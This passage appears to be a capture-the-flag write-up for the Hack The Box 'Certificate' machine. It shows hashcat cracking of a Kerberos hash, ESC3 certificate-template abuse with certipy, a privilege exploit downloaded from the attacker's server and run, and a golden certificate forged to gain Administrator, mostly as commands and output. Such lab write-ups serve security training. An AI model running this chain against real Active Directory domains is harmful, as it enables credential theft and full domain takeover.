$krb5pa$18$Lion.SK$CERTIFICATE.HTB$23f5159fa1c66ed7b0e561543eba6c010cd31f7e4a4377c2925cf306b98ed1e4f3951a50bc083c9bc0f16f0f586181c9d4ceda3fb5e852f0:<PASSWORD_REDACTED>
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 19900 (Kerberos 5, etype 18, Pre-Auth)
Hash.Target......: $krb5pa$18$Lion.SK$CERTIFICATE.HTB$23f5159fa1c66ed7...e852f0
Time.Started.....: Tue Aug 26 01:55:52 2025 (3 secs)
Time.Estimated...: Tue Aug 26 01:55:55 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     5395 H/s (13.19ms) @ Accel:128 Loops:512 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 14080/14344385 (0.10%)
Rejected.........: 0/14080 (0.00%)
Restore.Point....: 13440/14344385 (0.09%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:3584-4095
Candidate.Engine.: Device Generator
Candidates.#1....: vonnie -> doghouse
Hardware.Mon.#1..: Util: 71%
```

Let's authenticate with `kerberos`
```bash
┌──(kali@kali)-[~/certificate.htb]
└─$ sync-ad getTGT.py -dc-ip 10.10.11.71 'certificate.htb/lion.sk:<PASSWORD_REDACTED>'
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Saving ticket in lion.sk.ccache

┌──(kali@kali)-[~/certificate.htb]
└─$ export KRB5CCNAME=$(pwd)/lion.sk.ccache     
```

Now we can login and grab the `user.txt` flag
```bash
┌──(kali@kali)-[~/certificate.htb]
└─$ sync-ad evil-winrm -i dc01.certificate.htb -r certificate.htb

Evil-WinRM shell v3.7

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Lion.SK\Documents> whoami
certificate\lion.sk
*Evil-WinRM* PS C:\Users\Lion.SK\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\Users\Lion.SK\Documents> cat ../Desktop/user.txt
```

![htb-certificate-user-txt](images/HTB-certificate/htb-certificate-user-txt.png)

## root.txt
### lion.sk -> ryan.k
Let's check if there are vulnerable certificates
```bash
┌──(kali@kali)-[~/certificate.htb]
└─$ sync-ad certipy-ad find -u lion.sk@certificate.htb -p '<PASSWORD_REDACTED>' -dc-ip 10.10.11.71 -stdout -vulnerable
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 35 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 18 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'Certificate-LTD-CA' via RRP
[*] Successfully retrieved CA configuration for 'Certificate-LTD-CA'
[*] Checking web enrollment for CA 'Certificate-LTD-CA' @ 'DC01.certificate.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : Certificate-LTD-CA
    DNS Name                            : DC01.certificate.htb
    Certificate Subject                 : CN=Certificate-LTD-CA, DC=certificate, DC=htb
    Certificate Serial Number           : 75B2F4BBF31F108945147B466131BDCA
    Certificate Validity Start          : 2024-11-03 22:55:09+00:00
    Certificate Validity End            : 2034-11-03 23:05:09+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : CERTIFICATE.HTB\Administrators
      Access Rights
        ManageCa                        : CERTIFICATE.HTB\Administrators
                                          CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        ManageCertificates              : CERTIFICATE.HTB\Administrators
                                          CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        Enroll                          : CERTIFICATE.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : Delegated-CRA
    Display Name                        : Delegated-CRA
    Certificate Authorities             : Certificate-LTD-CA
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : True
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectAltRequireEmail
                                          SubjectRequireEmail
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollment
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Certificate Request Agent
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-05T19:52:09+00:00
    Template Last Modified              : 2024-11-05T19:52:10+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : CERTIFICATE.HTB\Domain CRA Managers
                                          CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : CERTIFICATE.HTB\Administrator
        Full Control Principals         : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        Write Owner Principals          : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        Write Dacl Principals           : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        Write Property Enroll           : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
    [+] User Enrollable Principals      : CERTIFICATE.HTB\Domain CRA Managers
    [!] Vulnerabilities
      ESC3                              : Template has Certificate Request Agent EKU set.
```

We can run [privilege escalation 3](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc3-enrollment-agent-certificate-template){:target="_blank"}{:rel="noopener noreferrer"} from the `certipy` docs! Using the `Delegated-CRA` certificate as an enrollment agent with a template certificate that allows agent enrollment, we'll be able to **request certificates on behalf of other users**

The `SignedUser` template is suitable for this attack
```bash
┌──(kali@kali)-[~/certificate.htb]
└─$ sync-ad certipy-ad find -u lion.sk@certificate.htb -p '<PASSWORD_REDACTED>' -dc-ip 10.10.11.71 -stdout 
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 35 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 18 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'Certificate-LTD-CA' via RRP
[*] Successfully retrieved CA configuration for 'Certificate-LTD-CA'
[*] Checking web enrollment for CA 'Certificate-LTD-CA' @ 'DC01.certificate.htb'
# ...
Certificate Templates
# ...
  1
    Template Name                       : SignedUser
    Display Name                        : Signed User
    Certificate Authorities             : Certificate-LTD-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectAltRequireEmail
                                          SubjectRequireEmail
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollment
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Client Authentication
                                          Secure Email
                                          Encrypting File System
    Requires Manager Approval           : False
    Requires Key Archival               : False
    RA Application Policies             : Certificate Request Agent
    Authorized Signatures Required      : 1
    Schema Version                      : 2
    Validity Period                     : 10 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-03T23:51:13+00:00
    Template Last Modified              : 2024-11-03T23:51:14+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Domain Users
                                          CERTIFICATE.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : CERTIFICATE.HTB\Administrator
        Full Control Principals         : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        Write Owner Principals          : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        Write Dacl Principals           : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        Write Property Enroll           : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Domain Users
                                          CERTIFICATE.HTB\Enterprise Admins
    [+] User Enrollable Principals      : CERTIFICATE.HTB\Domain Users
    [*] Remarks
      ESC3 Target Template              : Template can be targeted as part of ESC3 exploitation. This is not a vulnerability by itself. See the wiki for more details. Template requires a signature with the Certificate Request Agent application policy.
# ...  
```

Obtain the **Enrollment Agent Certificate**
```bash
┌──(kali@kali)-[~/certificate.htb]
└─$ sync-ad certipy-ad req -u 'lion.sk@certificate.htb' -p '<PASSWORD_REDACTED>' \
    -dc-ip '10.10.11.71' -target 'certificate.htb' \
    -ca 'Certificate-LTD-CA' -template 'Delegated-CRA'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 21
[*] Successfully requested certificate
[*] Got certificate with UPN 'Lion.SK@certificate.htb'
[*] Certificate object SID is 'S-1-5-21-515537669-4223687196-3249690583-1115'
[*] Saving certificate and private key to 'lion.sk.pfx'
[*] Wrote certificate and private key to 'lion.sk.pfx'
```

Now we'll use it to **request a certificate on behalf of another user.** To escalate privileges we'll try to impersonate the `Administrator` account
```bash
┌──(kali@kali)-[~/certificate.htb]
└─$ sync-ad certipy-ad req -u 'lion.sk@corp.local' -p '<PASSWORD_REDACTED>' \
    -dc-ip '10.10.11.71' -target 'certificate.htb' \
    -ca 'Certificate-LTD-CA' -template 'SignedUser' \
    -pfx 'lion.sk.pfx' -on-behalf-of 'CERTIFICATE\Administrator'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 22
[-] Got error while requesting certificate: code: 0x80094812 - CERTSRV_E_SUBJECT_EMAIL_REQUIRED - The email name is unavailable and cannot be added to the Subject or Subject Alternate name.
Would you like to save the private key? (y/N): n
[-] Failed to request certificate
```

Hmm this doesn't work so let's impersonate another user
```powershell
*Evil-WinRM* PS C:\Users> net users

User accounts for \\

-------------------------------------------------------------------------------
Administrator            akeder.kh                Alex.D
Aya.W                    Eva.F                    Guest
John.C                   Kai.X                    kara.m
karol.s                  krbtgt                   Lion.SK
Maya.K                   Nya.S                    Ryan.K
saad.m                   Sara.B                   xamppuser
The command completed with one or more errors.

*Evil-WinRM* PS C:\Users> dir


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       12/30/2024   8:33 PM                Administrator
d-----       11/23/2024   6:59 PM                akeder.kh
d-----        11/4/2024  12:55 AM                Lion.SK
d-r---        11/3/2024   1:05 AM                Public
d-----        11/3/2024   7:26 PM                Ryan.K
d-----       11/26/2024   4:12 PM                Sara.B
d-----       12/29/2024   5:30 PM                xamppuser
```

Let's impersonate `Ryan.K` as they have their own directory
```bash
┌──(kali@kali)-[~/certificate.htb]
└─$ sync-ad certipy-ad req -u 'lion.sk@corp.local' -p '<PASSWORD_REDACTED>' \
    -dc-ip '10.10.11.71' -target 'certificate.htb' \
    -ca 'Certificate-LTD-CA' -template 'SignedUser' \
    -pfx 'lion.sk.pfx' -on-behalf-of 'CERTIFICATE\Ryan.K'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 23
[*] Successfully requested certificate
[*] Got certificate with UPN 'Ryan.K@certificate.htb'
[*] Certificate object SID is 'S-1-5-21-515537669-4223687196-3249690583-1117'
[*] Saving certificate and private key to 'ryan.k.pfx'
[*] Wrote certificate and private key to 'ryan.k.pfx'
```

### ryan.k -> Administrator
With the `ryan.k.pfx` private key we can authenticate with `kerberos`
```bash
┌──(kali@kali)-[~/certificate.htb]
└─$ sync-ad certipy auth -pfx 'ryan.k.pfx' -dc-ip 10.10.11.71           
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: ryan.k@certificate.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'ryan.k.ccache'
[*] Trying to retrieve NT hash for 'ryan.k'
[*] Got hash for 'ryan.k@certificate.htb': <HASH_REDACTED>
```

Login to the server
```bash
┌──(kali@kali)-[~/certificate.htb]
└─$ export KRB5CCNAME=$(pwd)/ryan.k.ccache 

┌──(kali@kali)-[~/certificate.htb]
└─$ sync-ad evil-winrm -i dc01.certificate.htb -r certificate.htb

Evil-WinRM shell v3.7

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Ryan.K\Documents> whoami
certificate\ryan.k
```

Checking the machine's certificate store we find the **root certification authority template** but we can't do anything since we're `Missing stored keyset`
```powershell
*Evil-WinRM* PS C:\Users\Ryan.K\Documents> certutil -store my
my "Personal"
# ...
================ Certificate 3 ================
Serial Number: 75b2f4bbf31f108945147b466131bdca
Issuer: CN=Certificate-LTD-CA, DC=certificate, DC=htb
 NotBefore: 11/3/2024 3:55 PM
 NotAfter: 11/3/2034 4:05 PM
Subject: CN=Certificate-LTD-CA, DC=certificate, DC=htb
Certificate Template Name (Certificate Type): CA
CA Version: V0.0
Signature matches Public Key
Root Certificate: Subject matches Issuer
Template: CA, Root Certification Authority
Cert Hash(sha1): 2f02901dcff083ed3dbb6cb0a15bbfee6002b1a8
  Key Container = Certificate-LTD-CA
  Provider = Microsoft Software Key Storage Provider
Missing stored keyset
CertUtil: -store command completed successfully.
```

However, `ryan.k` has an interesting privilege 
```powershell
*Evil-WinRM* PS C:\Users\Ryan.K\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                      State
============================= ================================ =======
SeMachineAccountPrivilege     Add workstations to domain       Enabled
SeChangeNotifyPrivilege       Bypass traverse checking         Enabled
SeManageVolumePrivilege       Perform volume maintenance tasks Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set   Enabled
```

#### SeManageVolumePrivilege
We can leverage the `SeManageVolumePrivilege` to gain **full read/write access to the disk**. Using this we can **obtain the CA's private key** to create a golden certificate! 

We need to upload and run [this exploit](https://github.com/CsEnox/SeManageVolumeExploit){:target="_blank"}{:rel="noopener noreferrer"} to the machine
```bash
┌──(kali@kali)-[~/certificate.htb]
└─$ wget https://github.com/CsEnox/SeManageVolumeExploit/releases/download/public/SeManageVolumeExploit.exe

┌──(kali@kali)-[~/certificate.htb]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```powershell
*Evil-WinRM* PS C:\Users\Ryan.K\Documents> Invoke-WebRequest "http://10.10.14.17:80/SeManageVolumeExploit.exe" -OutFile "exploit.exe"
*Evil-WinRM* PS C:\Users\Ryan.K\Documents> ./exploit.exe
Entries changed: 862

DONE
```

Looking at the certificates again
```powershell
*Evil-WinRM* PS C:\Users\Ryan.K\Documents> certutil -store my
# ...
================ Certificate 3 ================
Serial Number: 75b2f4bbf31f108945147b466131bdca
Issuer: CN=Certificate-LTD-CA, DC=certificate, DC=htb
 NotBefore: 11/3/2024 3:55 PM
 NotAfter: 11/3/2034 4:05 PM
Subject: CN=Certificate-LTD-CA, DC=certificate, DC=htb
Certificate Template Name (Certificate Type): CA
CA Version: V0.0
Signature matches Public Key
Root Certificate: Subject matches Issuer
Template: CA, Root Certification Authority
Cert Hash(sha1): 2f02901dcff083ed3dbb6cb0a15bbfee6002b1a8
  Key Container = Certificate-LTD-CA
  Unique container name: 26b68cbdfcd6f5e467996e3f3810f3ca_7989b711-2e3f-4107-9aae-fb8df2e3b958
  Provider = Microsoft Software Key Storage Provider
Signature test passed
CertUtil: -store command completed successfully.
```

`Signature test passed` means we can use this ticket to perform a [golden certificate](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc5-vulnerable-pki-object-access-control){:target="_blank"}{:rel="noopener noreferrer"} attack
#### Golden Certificate
Let's export and download the target ticket to our machine
```powershell

*Evil-WinRM* PS C:\Users\Ryan.K\Documents> certutil -exportPFX 75b2f4bbf31f108945147b466131bdca ca_cert.pfx
MY "Personal"
================ Certificate 3 ================
Serial Number: 75b2f4bbf31f108945147b466131bdca
Issuer: CN=Certificate-LTD-CA, DC=certificate, DC=htb
 NotBefore: 11/3/2024 3:55 PM
 NotAfter: 11/3/2034 4:05 PM
Subject: CN=Certificate-LTD-CA, DC=certificate, DC=htb
Certificate Template Name (Certificate Type): CA
CA Version: V0.0
Signature matches Public Key
Root Certificate: Subject matches Issuer
Template: CA, Root Certification Authority
Cert Hash(sha1): 2f02901dcff083ed3dbb6cb0a15bbfee6002b1a8
  Key Container = Certificate-LTD-CA
  Unique container name: 26b68cbdfcd6f5e467996e3f3810f3ca_7989b711-2e3f-4107-9aae-fb8df2e3b958
  Provider = Microsoft Software Key Storage Provider
Signature test passed
Enter new password for output file ca_cert.pfx:
Enter new password:
Confirm new password:
CertUtil: -exportPFX command completed successfully.

*Evil-WinRM* PS C:\Users\Ryan.K\Documents> download ca_cert.pfx /home/kali/certificate.htb/ca_cert.pfx

Info: Downloading C:\Users\Ryan.K\Documents\ca_cert.pfx to /home/kali/certificate.htb/ca_cert.pfx

Info: Download successful!
```

With the **root CA certificate** and private key, we can **forge an `Adminstrator` certificate**
```bash
┌──(kali@kali)-[~/certificate.htb]
└─$ sync-ad certipy-ad forge \
    -ca-pfx 'ca_cert.pfx' -upn 'Administrator@certificate.htb' \
    -sid 'S-1-5-21-515537669-4223687196-3249690583-500' -crl 'ldap:///'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Saving forged certificate and private key to 'administrator_forged.pfx'
[*] Wrote forged certificate and private key to 'administrator_forged.pfx'
```

Now we can authenticate as `Administrator`
```bash
┌──(kali@kali)-[~/certificate.htb]
└─$ sync-ad certipy-ad auth -pfx administrator_forged.pfx -dc-ip 10.10.11.71
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Administrator@certificate.htb'
[*]     SAN URL SID: 'S-1-5-21-515537669-4223687196-3249690583-500'
[*]     Security Extension SID: 'S-1-5-21-515537669-4223687196-3249690583-500'
[*] Using principal: 'administrator@certificate.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@certificate.htb': <HASH_REDACTED>
```

Login and grab the `root.txt` flag
```bash
┌──(kali@kali)-[~/certificate.htb]
└─$ export KRB5CCNAME=$(pwd)/administrator.ccache

┌──(kali@kali)-[~/certificate.htb]
└─$ sync-ad evil-winrm -i dc01.certificate.htb -r certificate.htb
```

![htb-certificate-root-txt](images/HTB-certificate/htb-certificate-root-txt.png)
